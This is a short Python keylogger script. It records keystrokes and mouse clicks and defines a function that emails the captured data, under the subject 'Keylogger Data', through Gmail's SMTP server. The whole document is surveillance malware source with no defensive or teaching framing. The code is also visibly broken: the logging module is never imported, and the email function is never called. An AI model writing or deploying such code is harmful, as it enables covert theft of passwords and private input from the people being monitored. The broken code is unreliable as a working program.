import keyboard
import smtplib
import os
from pynput import mouse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Function to send email
def send_email(email, password, message):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Keylogger Data"
    msg.attach(MIMEText(message, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.send_message(msg)
    server.quit()

# Function to log keys
def on_press(key):
    logging.info(str(key))

# Function to log mouse clicks
def on_click(x, y, button, pressed):
    logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

# Start logging keys
keyboard.on_press(on_press)

# Start logging mouse clicks
with mouse.Listener(on_click=on_click) as listener:
    listener.join()
